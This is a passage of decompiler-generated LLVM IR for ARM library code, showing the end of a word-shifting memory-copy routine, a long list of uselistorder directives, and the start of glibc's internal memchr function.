  %v9_16fdc = load i32, i32* %v8_16fdc, align 4
  store i32 %v9_16fdc, i32* %r5.global-to-local, align 4
  %v10_16fdc = add i32 %v0_16fdc, -16
  %v11_16fdc = inttoptr i32 %v10_16fdc to i32*
  %v12_16fdc = load i32, i32* %v11_16fdc, align 4
  store i32 %v10_16fdc, i32* %r1.global-to-local, align 4
  %v4_16fe0 = udiv i32 %v12_16fdc, 65536
  %v5_16fe0 = or i32 %v4_16fe0, %v3_16fd8
  store i32 %v5_16fe0, i32* %lr.global-to-local, align 4
  %v3_16fe4 = mul i32 %v12_16fdc, 65536
  %v4_16fe8 = udiv i32 %v9_16fdc, 65536
  %v5_16fe8 = or i32 %v3_16fe4, %v4_16fe8
  store i32 %v5_16fe8, i32* @ip, align 4
  %v3_16fec = mul i32 %v9_16fdc, 65536
  %v4_16ff0 = udiv i32 %v6_16fdc, 65536
  %v5_16ff0 = or i32 %v3_16fec, %v4_16ff0
  store i32 %v5_16ff0, i32* %r5.global-to-local, align 4
  %v3_16ff4 = mul i32 %v6_16fdc, 65536
  %v4_16ff8 = udiv i32 %v3_16fdc, 65536
  %v5_16ff8 = or i32 %v3_16ff4, %v4_16ff8
  store i32 %v5_16ff8, i32* %r4.global-to-local, align 4
  %v1_16ffc = add i32 %v0_16ffc, -16
  %v2_16ffc = inttoptr i32 %v1_16ffc to i32*
  store i32 %v5_16ff8, i32* %v2_16ffc, align 4
  %v4_16ffc = add i32 %v0_16ffc, -12
  %v5_16ffc = inttoptr i32 %v4_16ffc to i32*
  %v6_16ffc = load i32, i32* %r5.global-to-local, align 4
  store i32 %v6_16ffc, i32* %v5_16ffc, align 4
  %v7_16ffc = add i32 %v0_16ffc, -8
  %v8_16ffc = inttoptr i32 %v7_16ffc to i32*
  %v9_16ffc = load i32, i32* @ip, align 4
  store i32 %v9_16ffc, i32* %v8_16ffc, align 4
  %v10_16ffc = add i32 %v0_16ffc, -4
  %v11_16ffc = inttoptr i32 %v10_16ffc to i32*
  %v12_16ffc = load i32, i32* %lr.global-to-local, align 4
  store i32 %v12_16ffc, i32* %v11_16ffc, align 4
  store i32 %v1_16ffc, i32* %r0.global-to-local, align 4
  %v0_17000 = load i32, i32* %r2.global-to-local, align 4
  %v2_17000 = add i32 %v0_17000, -16
  store i32 %v2_17000, i32* %r2.global-to-local, align 4
  %v6_17004 = icmp slt i32 %v0_17000, 16
  br i1 %v6_17004, label %dec_label_pc_17008, label %dec_label_pc_16fd8.dec_label_pc_16fd8_crit_edge

dec_label_pc_16fd8.dec_label_pc_16fd8_crit_edge:  ; preds = %dec_label_pc_16fd8
  %v0_16fd8.pre = load i32, i32* @r3, align 4
  %v0_16fdc.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_16fd8

dec_label_pc_17008:                               ; preds = %dec_label_pc_16fd8
  %v2_17008 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_17008, i32* @r4, align 4
  %v5_17008 = load i8*, i8** %stack_var_-8, align 4
  %v6_17008 = ptrtoint i8* %v5_17008 to i32
  store i32 %v6_17008, i32* @r5, align 4
  store i32 %v11_16fd4, i32* @lr, align 4
  %v2_1700c = add i32 %v0_17000, -4
  store i32 %v2_1700c, i32* %r2.global-to-local, align 4
  %v4_1700c = add i32 %v0_17000, 2147483632
  %v5_1700c = and i32 %v2_1700c, %v4_1700c
  %v6_1700c = icmp slt i32 %v5_1700c, 0
  store i1 %v6_1700c, i1* %cpsr_v.global-to-local, align 1
  %v7_1700c = icmp slt i32 %v2_1700c, 0
  store i1 %v7_1700c, i1* %cpsr_n.global-to-local, align 1
  %v8_1700c = icmp eq i32 %v2_1700c, 0
  store i1 %v8_1700c, i1* %cpsr_z.global-to-local, align 1
  %v5_17010 = icmp slt i32 %v2_17000, -12
  br i1 %v5_17010, label %dec_label_pc_1702c, label %dec_label_pc_17014

dec_label_pc_17014:                               ; preds = %dec_label_pc_17008, %dec_label_pc_16fc8, %dec_label_pc_17014
  %v1_17020 = phi i32 [ %v5_17020, %dec_label_pc_17014 ], [ %v1_16ffc, %dec_label_pc_17008 ], [ %v0_16f9019, %dec_label_pc_16fc8 ]
  %v0_17014 = load i32, i32* @r3, align 4
  %v3_17014 = mul i32 %v0_17014, 65536
  store i32 %v3_17014, i32* %ip.global-to-local, align 4
  %v0_17018 = load i32, i32* %r1.global-to-local, align 4
  %v1_17018 = add i32 %v0_17018, -4
  %v2_17018 = inttoptr i32 %v1_17018 to i32*
  %v3_17018 = load i32, i32* %v2_17018, align 4
  store i32 %v3_17018, i32* @r3, align 4
  store i32 %v1_17018, i32* %r1.global-to-local, align 4
  %v4_1701c = udiv i32 %v3_17018, 65536
  %v5_1701c = or i32 %v4_1701c, %v3_17014
  store i32 %v5_1701c, i32* @ip, align 4
  %v2_17020 = add i32 %v1_17020, -4
  %v3_17020 = inttoptr i32 %v2_17020 to i32*
  store i32 %v5_1701c, i32* %v3_17020, align 4
  %v4_17020 = load i32, i32* %r0.global-to-local, align 4
  %v5_17020 = add i32 %v4_17020, -4
  store i32 %v5_17020, i32* %r0.global-to-local, align 4
  %v0_17024 = load i32, i32* %r2.global-to-local, align 4
  %v2_17024 = add i32 %v0_17024, -4
  store i32 %v2_17024, i32* %r2.global-to-local, align 4
  %v6_17028 = icmp slt i32 %v0_17024, 4
  br i1 %v6_17028, label %dec_label_pc_1702c.loopexit, label %dec_label_pc_17014

dec_label_pc_1702c.loopexit:                      ; preds = %dec_label_pc_17014
  %v4_17024 = sub i32 3, %v0_17024
  %v5_17024 = and i32 %v4_17024, %v0_17024
  %v6_17024 = icmp slt i32 %v5_17024, 0
  %v7_17024 = icmp slt i32 %v2_17024, 0
  store i1 %v6_17024, i1* %cpsr_v.global-to-local, align 1
  store i1 %v7_17024, i1* %cpsr_n.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_1702c

dec_label_pc_1702c:                               ; preds = %dec_label_pc_1702c.loopexit, %dec_label_pc_17008
  %v2_16f0452 = phi i32 [ %v5_17020, %dec_label_pc_1702c.loopexit ], [ %v1_16ffc, %dec_label_pc_17008 ]
  %v0_16ef448 = phi i32 [ %v2_17024, %dec_label_pc_1702c.loopexit ], [ %v2_1700c, %dec_label_pc_17008 ]
  %v0_1702c = load i32, i32* %r1.global-to-local, align 4
  %v1_1702c = add i32 %v0_1702c, 2
  store i32 %v1_1702c, i32* %r1.global-to-local, align 4
  br label %bb151

dec_label_pc_17034:                               ; preds = %dec_label_pc_16f48
  br i1 %v5_17038, label %dec_label_pc_17080, label %dec_label_pc_1703c

dec_label_pc_1703c:                               ; preds = %dec_label_pc_17034
  store i32 %v2_17034, i32* %r2.global-to-local, align 4
  %v3_17040 = load i32, i32* @r4, align 4
  store i32 %v3_17040, i32* %stack_var_-12, align 4
  %v6_17040 = load i32, i32* @r5, align 4
  %v8_17040 = inttoptr i32 %v6_17040 to i8*
  store i8* %v8_17040, i8** %stack_var_-8, align 4
  %v11_17040 = load i32, i32* @lr, align 4
  br label %dec_label_pc_17044

dec_label_pc_17044:                               ; preds = %dec_label_pc_17044.dec_label_pc_17044_crit_edge, %dec_label_pc_1703c
  %v0_17068 = phi i32 [ %v1_17068, %dec_label_pc_17044.dec_label_pc_17044_crit_edge ], [ %v0_16f9019, %dec_label_pc_1703c ]
  %v0_17048 = phi i32 [ %v0_17048.pre, %dec_label_pc_17044.dec_label_pc_17044_crit_edge ], [ %v1_16f48, %dec_label_pc_1703c ]
  %v0_17044 = phi i32 [ %v0_17044.pre, %dec_label_pc_17044.dec_label_pc_17044_crit_edge ], [ %v2_16f4c, %dec_label_pc_1703c ]
  %v3_17044 = mul i32 %v0_17044, 16777216
  store i32 %v3_17044, i32* %lr.global-to-local, align 4
  %v1_17048 = add i32 %v0_17048, -4
  %v2_17048 = inttoptr i32 %v1_17048 to i32*
  %v3_17048 = load i32, i32* %v2_17048, align 4
  store i32 %v3_17048, i32* @r3, align 4
  %v4_17048 = add i32 %v0_17048, -8
  %v5_17048 = inttoptr i32 %v4_17048 to i32*
  %v6_17048 = load i32, i32* %v5_17048, align 4
  store i32 %v6_17048, i32* %r4.global-to-local, align 4
  %v7_17048 = add i32 %v0_17048, -12
  %v8_17048 = inttoptr i32 %v7_17048 to i32*
  %v9_17048 = load i32, i32* %v8_17048, align 4
  store i32 %v9_17048, i32* %r5.global-to-local, align 4
  %v10_17048 = add i32 %v0_17048, -16
  %v11_17048 = inttoptr i32 %v10_17048 to i32*
  %v12_17048 = load i32, i32* %v11_17048, align 4
  store i32 %v10_17048, i32* %r1.global-to-local, align 4
  %v4_1704c = udiv i32 %v12_17048, 256
  %v5_1704c = or i32 %v4_1704c, %v3_17044
  store i32 %v5_1704c, i32* %lr.global-to-local, align 4
  %v3_17050 = mul i32 %v12_17048, 16777216
  %v4_17054 = udiv i32 %v9_17048, 256
  %v5_17054 = or i32 %v3_17050, %v4_17054
  store i32 %v5_17054, i32* @ip, align 4
  %v3_17058 = mul i32 %v9_17048, 16777216
  %v4_1705c = udiv i32 %v6_17048, 256
  %v5_1705c = or i32 %v3_17058, %v4_1705c
  store i32 %v5_1705c, i32* %r5.global-to-local, align 4
  %v3_17060 = mul i32 %v6_17048, 16777216
  %v4_17064 = udiv i32 %v3_17048, 256
  %v5_17064 = or i32 %v3_17060, %v4_17064
  store i32 %v5_17064, i32* %r4.global-to-local, align 4
  %v1_17068 = add i32 %v0_17068, -16
  %v2_17068 = inttoptr i32 %v1_17068 to i32*
  store i32 %v5_17064, i32* %v2_17068, align 4
  %v4_17068 = add i32 %v0_17068, -12
  %v5_17068 = inttoptr i32 %v4_17068 to i32*
  %v6_17068 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v6_17068, i32* %v5_17068, align 4
  %v7_17068 = add i32 %v0_17068, -8
  %v8_17068 = inttoptr i32 %v7_17068 to i32*
  %v9_17068 = load i32, i32* @ip, align 4
  store i32 %v9_17068, i32* %v8_17068, align 4
  %v10_17068 = add i32 %v0_17068, -4
  %v11_17068 = inttoptr i32 %v10_17068 to i32*
  %v12_17068 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v12_17068, i32* %v11_17068, align 4
  store i32 %v1_17068, i32* %r0.global-to-local, align 4
  %v0_1706c = load i32, i32* %r2.global-to-local, align 4
  %v2_1706c = add i32 %v0_1706c, -16
  store i32 %v2_1706c, i32* %r2.global-to-local, align 4
  %v6_17070 = icmp slt i32 %v0_1706c, 16
  br i1 %v6_17070, label %dec_label_pc_17074, label %dec_label_pc_17044.dec_label_pc_17044_crit_edge

dec_label_pc_17044.dec_label_pc_17044_crit_edge:  ; preds = %dec_label_pc_17044
  %v0_17044.pre = load i32, i32* @r3, align 4
  %v0_17048.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_17044

dec_label_pc_17074:                               ; preds = %dec_label_pc_17044
  %v2_17074 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_17074, i32* @r4, align 4
  %v5_17074 = load i8*, i8** %stack_var_-8, align 4
  %v6_17074 = ptrtoint i8* %v5_17074 to i32
  store i32 %v6_17074, i32* @r5, align 4
  store i32 %v11_17040, i32* @lr, align 4
  %v2_17078 = add i32 %v0_1706c, -4
  store i32 %v2_17078, i32* %r2.global-to-local, align 4
  %v4_17078 = add i32 %v0_1706c, 2147483632
  %v5_17078 = and i32 %v2_17078, %v4_17078
  %v6_17078 = icmp slt i32 %v5_17078, 0
  store i1 %v6_17078, i1* %cpsr_v.global-to-local, align 1
  %v7_17078 = icmp slt i32 %v2_17078, 0
  store i1 %v7_17078, i1* %cpsr_n.global-to-local, align 1
  %v8_17078 = icmp eq i32 %v2_17078, 0
  store i1 %v8_17078, i1* %cpsr_z.global-to-local, align 1
  %v5_1707c = icmp slt i32 %v2_1706c, -12
  br i1 %v5_1707c, label %dec_label_pc_17098, label %dec_label_pc_17080

dec_label_pc_17080:                               ; preds = %dec_label_pc_17074, %dec_label_pc_17034, %dec_label_pc_17080
  %v1_1708c = phi i32 [ %v5_1708c, %dec_label_pc_17080 ], [ %v1_17068, %dec_label_pc_17074 ], [ %v0_16f9019, %dec_label_pc_17034 ]
  %v0_17080 = load i32, i32* @r3, align 4
  %v3_17080 = mul i32 %v0_17080, 16777216
  store i32 %v3_17080, i32* %ip.global-to-local, align 4
  %v0_17084 = load i32, i32* %r1.global-to-local, align 4
  %v1_17084 = add i32 %v0_17084, -4
  %v2_17084 = inttoptr i32 %v1_17084 to i32*
  %v3_17084 = load i32, i32* %v2_17084, align 4
  store i32 %v3_17084, i32* @r3, align 4
  store i32 %v1_17084, i32* %r1.global-to-local, align 4
  %v4_17088 = udiv i32 %v3_17084, 256
  %v5_17088 = or i32 %v4_17088, %v3_17080
  store i32 %v5_17088, i32* @ip, align 4
  %v2_1708c = add i32 %v1_1708c, -4
  %v3_1708c = inttoptr i32 %v2_1708c to i32*
  store i32 %v5_17088, i32* %v3_1708c, align 4
  %v4_1708c = load i32, i32* %r0.global-to-local, align 4
  %v5_1708c = add i32 %v4_1708c, -4
  store i32 %v5_1708c, i32* %r0.global-to-local, align 4
  %v0_17090 = load i32, i32* %r2.global-to-local, align 4
  %v2_17090 = add i32 %v0_17090, -4
  store i32 %v2_17090, i32* %r2.global-to-local, align 4
  %v6_17094 = icmp slt i32 %v0_17090, 4
  br i1 %v6_17094, label %dec_label_pc_17098.loopexit, label %dec_label_pc_17080

dec_label_pc_17098.loopexit:                      ; preds = %dec_label_pc_17080
  %v4_17090 = sub i32 3, %v0_17090
  %v5_17090 = and i32 %v4_17090, %v0_17090
  %v6_17090 = icmp slt i32 %v5_17090, 0
  %v7_17090 = icmp slt i32 %v2_17090, 0
  store i1 %v6_17090, i1* %cpsr_v.global-to-local, align 1
  store i1 %v7_17090, i1* %cpsr_n.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_17098

dec_label_pc_17098:                               ; preds = %dec_label_pc_17098.loopexit, %dec_label_pc_17074
  %v2_16f0453 = phi i32 [ %v5_1708c, %dec_label_pc_17098.loopexit ], [ %v1_17068, %dec_label_pc_17074 ]
  %v0_16ef449 = phi i32 [ %v2_17090, %dec_label_pc_17098.loopexit ], [ %v2_17078, %dec_label_pc_17074 ]
  %v0_17098 = load i32, i32* %r1.global-to-local, align 4
  %v1_17098 = add i32 %v0_17098, 1
  store i32 %v1_17098, i32* %r1.global-to-local, align 4
  br label %bb151

; uselistorder directives
  uselistorder i32 %v5_1708c, { 0, 2, 1 }
  uselistorder i32 %v3_17080, { 1, 0 }
  uselistorder i32 %v2_17078, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v1_17068, { 1, 0, 4, 3, 2 }
  uselistorder i32 %v10_17048, { 1, 0 }
  uselistorder i32 %v3_17044, { 1, 0 }
  uselistorder i32 %v0_17048, { 3, 2, 1, 0 }
  uselistorder i32 %v0_17068, { 3, 2, 1, 0 }
  uselistorder i32 %v5_17020, { 0, 2, 1 }
  uselistorder i32 %v3_17014, { 1, 0 }
  uselistorder i32 %v2_1700c, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v1_16ffc, { 1, 0, 4, 3, 2 }
  uselistorder i32 %v10_16fdc, { 1, 0 }
  uselistorder i32 %v3_16fd8, { 1, 0 }
  uselistorder i32 %v0_16fdc, { 3, 2, 1, 0 }
  uselistorder i32 %v0_16ffc, { 3, 2, 1, 0 }
  uselistorder i32 %v5_16fb4, { 0, 2, 1 }
  uselistorder i32 %v3_16fa8, { 1, 0 }
  uselistorder i32 %v2_16fa0, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v1_16f90, { 1, 0, 4, 3, 2 }
  uselistorder i32 %v10_16f70, { 1, 0 }
  uselistorder i32 %v3_16f6c, { 1, 0 }
  uselistorder i32 %v0_16f70, { 3, 2, 1, 0 }
  uselistorder i32 %v0_16f90, { 3, 2, 1, 0 }
  uselistorder i1 %v5_17038, { 2, 0, 1 }
  uselistorder i32 %v0_16f50, { 1, 0 }
  uselistorder i32 %v0_1703c, { 4, 1, 0, 3, 2 }
  uselistorder i32 %v0_16f9019, { 0, 3, 1, 4, 2, 5 }
  uselistorder i32 %v1_16f40, { 2, 1, 0 }
  uselistorder i32 %v0_16f40, { 2, 0, 1 }
  uselistorder i32 %v2_16f38, { 3, 4, 0, 5, 2, 1 }
  uselistorder i32 %v1_16f38, { 1, 2, 0, 3 }
  uselistorder i32 %v0_16f38, { 2, 3, 0, 1, 4 }
  uselistorder i32 %v0_16f9020, { 2, 1, 0 }
  uselistorder i32 %v11_16f14, { 1, 0 }
  uselistorder i32 %v7_16f14, { 1, 0 }
  uselistorder i32 %v1_16ef4, { 0, 1, 3, 4, 2, 5 }
  uselistorder i32 %v0_16ef4, { 1, 2, 0, 3 }
  uselistorder i32 %v2_16ef8, { 1, 0 }
  uselistorder i32 %v7_16eec, { 0, 2, 1 }
  uselistorder i32 %v10_16ee8, { 1, 0 }
  uselistorder i32 %v9_16ee0, { 1, 0, 2 }
  uselistorder i32 %v6_16edc, { 1, 0 }
  uselistorder i32 %v2_16ed4, { 0, 2, 1, 3, 5, 6, 4, 7 }
  uselistorder i32 %v0_16ed4, { 1, 2, 4, 0, 3 }
  uselistorder i32 %v7_16ee4, { 0, 3, 2, 1 }
  uselistorder i32 %v7_16ec8, { 0, 2, 1 }
  uselistorder i32 %v13_16ec4, { 1, 0 }
  uselistorder i32 %v4_16ec0, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v0_16ec0, { 2, 0, 1 }
  uselistorder i32 %v6_16ec8, { 0, 3, 2, 1 }
  uselistorder i32 %v7_16eb8, { 0, 2, 1 }
  uselistorder i32 %v16_16eb4, { 1, 0 }
  uselistorder i32 %v4_16eb0, { 1, 2, 0 }
  uselistorder i32 %v0_16ec0.pr, { 1, 3, 0, 2 }
  uselistorder i32 %v6_16eb8, { 0, 4, 3, 2, 1 }
  uselistorder i32 %v1_16ea4, { 0, 3, 2, 1 }
  uselistorder i32 %v10_16ea0, { 1, 0 }
  uselistorder i32 %v1_16e9c, { 1, 0 }
  uselistorder i32 %v10_16e98, { 1, 0 }
  uselistorder i32 %v0_16e98, { 3, 2, 1, 0 }
  uselistorder i32 %v0_16e9c, { 0, 1, 2, 3, 7, 6, 5, 4 }
  uselistorder i32 %v2_16e90, { 0, 2, 1 }
  uselistorder i32 %v2_16e84, { 0, 2, 1, 3, 5, 4 }
  uselistorder i32 %v0_16e84, { 1, 2, 6, 3, 0, 5, 4 }
  uselistorder i32 %v0_16e9c37, { 1, 2, 0 }
  uselistorder i32 %v1_16e7c, { 2, 1, 0 }
  uselistorder i32 %v1_16e74, { 2, 3, 1, 0 }
  uselistorder i32 %v2_16e6c, { 2, 0, 1, 4, 3 }
  uselistorder i32 %v2_16e68, { 3, 4, 1, 2, 0, 5 }
  uselistorder i32 %v2_16e64, { 2, 3, 1, 0, 4 }
  uselistorder i32 %v1_16e64, { 3, 4, 0, 6, 5, 1, 2 }
  uselistorder i32 %v1_16e54, { 0, 2, 1 }
  uselistorder i32 %v4_16e50, { 1, 0 }
  uselistorder i32 %v3_16e44, { 1, 0 }
  uselistorder i32 %v1_16e3c, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v1_16e30, { 1, 0 }
  uselistorder i32 %v12_16e2c, { 0, 2, 1 }
  uselistorder i32 %v8_16e0c, { 1, 0, 2 }
  uselistorder i32 %v5_16e0c, { 1, 0, 2 }
  uselistorder i32 %v2_16e0c, { 1, 0, 2 }
  uselistorder i32 %v0_16e0c, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_16e2c, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_16de8, { 0, 2, 1 }
  uselistorder i32 %v4_16de4, { 1, 0 }
  uselistorder i32 %v3_16dd8, { 1, 0 }
  uselistorder i32 %v1_16dd0, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v1_16dc4, { 1, 0 }
  uselistorder i32 %v12_16dc0, { 0, 2, 1 }
  uselistorder i32 %v8_16da0, { 1, 0, 2 }
  uselistorder i32 %v5_16da0, { 1, 0, 2 }
  uselistorder i32 %v2_16da0, { 1, 0, 2 }
  uselistorder i32 %v0_16da0, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_16dc0, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_16d7c, { 0, 2, 1 }
  uselistorder i32 %v4_16d78, { 1, 0 }
  uselistorder i32 %v3_16d6c, { 1, 0 }
  uselistorder i32 %v1_16d64, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v1_16d58, { 1, 0 }
  uselistorder i32 %v12_16d54, { 0, 2, 1 }
  uselistorder i32 %v8_16d34, { 1, 0, 2 }
  uselistorder i32 %v5_16d34, { 1, 0, 2 }
  uselistorder i32 %v2_16d34, { 1, 0, 2 }
  uselistorder i32 %v0_16d34, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_16d54, { 4, 3, 2, 1, 0 }
  uselistorder i1 %v2_16d90, { 0, 2, 1 }
  uselistorder i32 %v1_16d8c, { 2, 0, 1, 3 }
  uselistorder i32 %v4_16d10, { 2, 0, 1, 3 }
  uselistorder i32 %v2_16d10, { 2, 0, 1, 3 }
  uselistorder i32 %v0_16d94, { 1, 0, 3, 2 }
  uselistorder i32 %v0_16e2c76, { 0, 5, 1, 3, 2, 4 }
  uselistorder i32 %v1_16d04, { 1, 0 }
  uselistorder i32 %v0_16d04, { 3, 1, 0, 2 }
  uselistorder i32 %v2_16cfc, { 2, 4, 0, 5, 1, 3 }
  uselistorder i32 %v1_16cfc, { 1, 0, 2 }
  uselistorder i32 %v0_16cfc, { 2, 0, 1, 3 }
  uselistorder i32 %v0_16e2c77, { 1, 0 }
  uselistorder i32 %v1_16cdc, { 1, 0, 3, 2, 4 }
  uselistorder i32 %v0_16ce4, { 1, 0 }
  uselistorder i32 %v0_16cb8, { 3, 0, 1, 2 }
  uselistorder i32 %v1_16cac, { 1, 2, 0, 3 }
  uselistorder i32 %v5_16c98, { 1, 0, 2 }
  uselistorder i32 %v1_16c94, { 1, 0 }
  uselistorder i32 %v1_16c8c, { 2, 0, 1, 4, 5, 3, 6 }
  uselistorder i32 %v0_16c8c, { 1, 2, 0, 3 }
  uselistorder i32 %v4_16c84, { 0, 2, 1 }
  uselistorder i32 %v3_16c84, { 3, 0, 1, 2 }
  uselistorder i1 %v0_16c84, { 1, 0 }
  uselistorder i1 %v1_16c84, { 1, 0 }
  uselistorder i32 %v3_16c80, { 0, 4, 3, 2, 1 }
  uselistorder i32 %v1_16c78, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v1_16c64, { 1, 2, 0 }
  uselistorder i32 %v1_16c5c, { 0, 2, 1 }
  uselistorder i32 %v12_16c58, { 0, 1, 3, 2 }
  uselistorder i32 %v0_16c4c, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_16c50, { 0, 1, 2, 3, 4, 5, 6, 7, 12, 11, 10, 9, 8 }
  uselistorder i32 %v1_16c40, { 0, 2, 1 }
  uselistorder i32 %v1_16c38, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v0_16c38, { 1, 2, 3, 0, 5, 4 }
  uselistorder i32 %v1_16c30, { 1, 0 }
  uselistorder i32 %v1_16c28, { 2, 1, 0 }
  uselistorder i32 %v2_16c20, { 1, 2, 0, 4, 3 }
  uselistorder i32 %v0_16c20, { 1, 4, 0, 2, 3 }
  uselistorder i32 %v8_16c1c, { 1, 0 }
  uselistorder i32 %v2_16c10, { 1, 0 }
  uselistorder i32 %v1_16c10, { 1, 4, 5, 3, 0, 6, 8, 2, 7, 9 }
  uselistorder i32 %v0_16c10, { 1, 7, 8, 6, 4, 0, 5, 10, 2, 3, 9, 11 }
  uselistorder i8** %stack_var_-8, { 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32* %r5.global-to-local, { 0, 1, 2, 3, 4, 5, 15, 16, 17, 6, 7, 8, 9, 10, 11, 12, 13, 14 }
  uselistorder i32* %r4.global-to-local, { 0, 1, 2, 3, 4, 26, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25 }
  uselistorder i32* %r2.global-to-local, { 0, 68, 1, 2, 3, 4, 5, 69, 6, 7, 8, 9, 10, 70, 11, 12, 66, 67, 71, 27, 13, 15, 14, 16, 17, 18, 19, 20, 21, 23, 22, 24, 25, 26, 28, 29, 61, 30, 31, 32, 33, 34, 62, 35, 36, 37, 38, 39, 63, 40, 41, 42, 43, 44, 64, 45, 46, 47, 49, 48, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 65 }
  uselistorder i32* %r1.global-to-local, { 2, 5, 3, 77, 4, 6, 8, 10, 7, 78, 9, 11, 13, 75, 12, 79, 74, 76, 80, 83, 81, 87, 88, 14, 15, 16, 18, 17, 19, 20, 82, 21, 22, 84, 23, 85, 24, 86, 25, 26, 27, 28, 29, 31, 33, 30, 45, 32, 34, 36, 38, 35, 46, 37, 39, 41, 43, 40, 47, 42, 44, 48, 49, 54, 50, 52, 51, 53, 55, 58, 56, 59, 57, 60, 61, 67, 62, 63, 68, 64, 69, 65, 70, 66, 71, 72, 73, 0, 1 }
  uselistorder i32* %r0.global-to-local, { 2, 56, 3, 4, 57, 5, 6, 58, 7, 55, 61, 62, 8, 9, 21, 10, 12, 11, 13, 14, 59, 15, 16, 60, 17, 18, 19, 20, 22, 23, 31, 24, 25, 32, 26, 27, 33, 28, 29, 34, 30, 35, 36, 38, 37, 39, 40, 42, 41, 43, 44, 50, 51, 45, 46, 47, 52, 48, 49, 53, 54, 0, 1 }
  uselistorder i32* %lr.global-to-local, { 0, 1, 2, 3, 4, 5, 35, 36, 37, 6, 7, 8, 9, 10, 11, 12, 13, 14, 23, 15, 16, 17, 24, 18, 19, 20, 25, 21, 22, 26, 27, 28, 29, 30, 31, 32, 33, 34 }
  uselistorder i1* %cpsr_z.global-to-local, { 4, 7, 5, 9, 6, 10, 8, 46, 47, 11, 12, 13, 14, 15, 16, 17, 18, 3, 19, 20, 21, 22, 23, 2, 24, 0, 25, 1, 27, 26, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45 }
  uselistorder i1* %cpsr_v.global-to-local, { 4, 7, 5, 9, 6, 10, 8, 44, 11, 12, 13, 14, 15, 16, 17, 18, 19, 3, 20, 21, 22, 2, 23, 1, 24, 0, 26, 25, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43 }
  uselistorder i1* %cpsr_n.global-to-local, { 4, 7, 5, 9, 6, 10, 8, 49, 50, 11, 12, 13, 14, 15, 16, 17, 18, 19, 3, 20, 21, 22, 23, 24, 2, 25, 1, 26, 0, 28, 27, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48 }
  uselistorder i32 2147483632, { 3, 4, 5, 2, 0, 1 }
  uselistorder i32 -5, { 1, 0, 2 }
  uselistorder i32 -28, { 1, 2, 0 }
  uselistorder label %dec_label_pc_17080, { 2, 0, 1 }
  uselistorder label %dec_label_pc_17014, { 2, 0, 1 }
  uselistorder label %dec_label_pc_16fa8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_16f48, { 1, 0 }
  uselistorder label %.thread14, { 2, 0, 1 }
  uselistorder label %.thread129, { 1, 0 }
  uselistorder label %bb151, { 4, 5, 6, 3, 7, 0, 1, 2 }
  uselistorder label %dec_label_pc_16ed4, { 1, 0 }
  uselistorder label %.thread4, { 1, 0 }
  uselistorder label %.thread2, { 1, 0 }
  uselistorder label %dec_label_pc_16e98, { 1, 0 }
  uselistorder label %dec_label_pc_16e84, { 1, 0 }
  uselistorder label %dec_label_pc_16e44, { 2, 0, 1 }
  uselistorder label %dec_label_pc_16dd8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_16d6c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_16d0c, { 1, 0 }
  uselistorder label %.thread128, { 1, 0 }
  uselistorder label %.thread127, { 1, 0 }
  uselistorder label %dec_label_pc_16cdc, { 1, 0 }
  uselistorder label %.thread126, { 1, 0 }
  uselistorder label %.thread125, { 1, 0 }
  uselistorder label %bb143, { 1, 0 }
  uselistorder label %bb141, { 4, 5, 6, 1, 7, 0, 2, 3 }
  uselistorder label %.thread115, { 1, 0 }
  uselistorder label %dec_label_pc_16c78, { 1, 0 }
  uselistorder label %bb138, { 1, 0 }
  uselistorder label %dec_label_pc_16c38, { 1, 0 }
}

define i32 @__GI_memchr(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v1_170a4 = urem i32 %arg1, 256
  %v0_170c0.pr = load i32, i32* @r2, align 4
  %v2_170c015 = icmp eq i32 %v0_170c0.pr, 0
  %v0_170d4.pre = load i32, i32* @r0, align 4
  br i1 %v2_170c015, label %dec_label_pc_170d0, label %dec_label_pc_170c8

dec_label_pc_170ac:                               ; preds = %dec_label_pc_170c8
  %v1_170ac = inttoptr i32 %v0_170bc to i8*
  %v2_170ac = load i8, i8* %v1_170ac, align 1
  %v3_170ac = zext i8 %v2_170ac to i32
  %v9_170b0 = icmp eq i32 %v3_170ac, %v1_170a4
  br i1 %v9_170b0, label %dec_label_pc_17180, label %dec_label_pc_170b8

dec_label_pc_170b8:                               ; preds = %dec_label_pc_170ac
  %v1_170b8 = add i32 %v0_170b8, -1
  %v1_170bc = add i32 %v0_170bc, 1
  %v2_170c0 = icmp eq i32 %v1_170b8, 0
  br i1 %v2_170c0, label %dec_label_pc_170d0, label %dec_label_pc_170c8

